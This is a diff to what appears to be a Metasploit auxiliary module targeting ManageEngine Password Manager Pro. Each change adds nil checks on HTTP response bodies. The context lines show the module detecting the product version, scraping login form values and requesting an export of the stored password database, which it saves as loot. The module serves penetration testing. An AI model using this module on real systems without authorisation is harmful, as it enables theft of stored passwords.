@@ -59,13 +59,13 @@ class Metasploit3 < Msf::Auxiliary
 
     if res && res.code == 200
       # 2nd step: we try to get the ORGN_NAME and AUTHRULE_NAME from the page (which is only needed for the MSP versions)
-      if res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
+      if res.body && res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
         orgn_name = $1
       else
         orgn_name = nil
       end
 
-      if res.body.to_s =~ /id="AUTHRULE_NAME" name="AUTHRULE_NAME" value="([\w]*)"/
+      if res.body && res.body.to_s =~ /id="AUTHRULE_NAME" name="AUTHRULE_NAME" value="([\w]*)"/
         authrule_name = $1
       else
         authrule_name = nil
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
           'userName' => username
         }
       })
-      if res && res.code == 200
+      if res && res.code == 200 && res.body
         domain_name = res.body.to_s.strip
       else
         domain_name = nil
@@ -192,7 +192,7 @@ class Metasploit3 < Msf::Auxiliary
                                'uri' => normalize_uri("PassTrixMain.cc"),
                                'method' => 'GET'
                            })
-    if res && res.code == 200 &&
+    if res && res.code == 200 && res.body &&
         res.body.to_s =~ /ManageEngine Password Manager Pro/ &&
         (
           res.body.to_s =~ /login\.css\?([0-9]+)/ ||                            # PMP v6
@@ -259,7 +259,7 @@ class Metasploit3 < Msf::Auxiliary
           'RequestType' => 'ExportResources'
         }
       })
-      if res && res.code == 200 && res.body.to_s.length > 0
+      if res && res.code == 200 && res.body && res.body.to_s.length > 0
         vprint_line(res.body.to_s)
         print_good("#{peer} - Successfully exported password database from Password Manager Pro.")
         loot_name     = 'manageengine.passwordmanagerpro.password.db'
